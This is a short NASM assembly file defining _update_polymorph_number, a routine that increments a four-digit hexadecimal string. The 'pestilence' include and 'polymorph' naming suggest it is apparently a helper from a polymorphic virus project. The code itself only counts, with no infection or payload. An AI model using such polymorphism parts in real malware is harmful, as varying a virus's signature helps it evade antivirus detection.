%define UPDATE_POLYMORPH_NUMBER
%include "pestilence.lst"

section .text
	global _update_polymorph_number

; _update_polymorph_number(char *number, short nbr_to_add)
_update_polymorph_number:
	enter 16, 0
	push rdi
	push rsi
;	sub rsp, 16

	.loop:
		cmp rsi, 0
		je _end
		mov rdx, 3
		.cmp:
		cmp BYTE [rdi + rdx], 'f'
		je .update
		cmp BYTE [rdi + rdx], '9'
		je .hexa_up
		inc BYTE [rdi + rdx]
		jmp .inc_before_reloop

		.hexa_up:
		mov BYTE [rdi + rdx], 'a'
		jmp .inc_before_reloop

		.update:
		mov BYTE [rdi + rdx], '0'
		cmp rdx, 0
		je _end
		dec rdx
		jmp .cmp

		.inc_before_reloop:
		dec rsi
		jmp .loop

_end:
	leave
	ret

%undef UPDATE_POLYMORPH_NUMBER
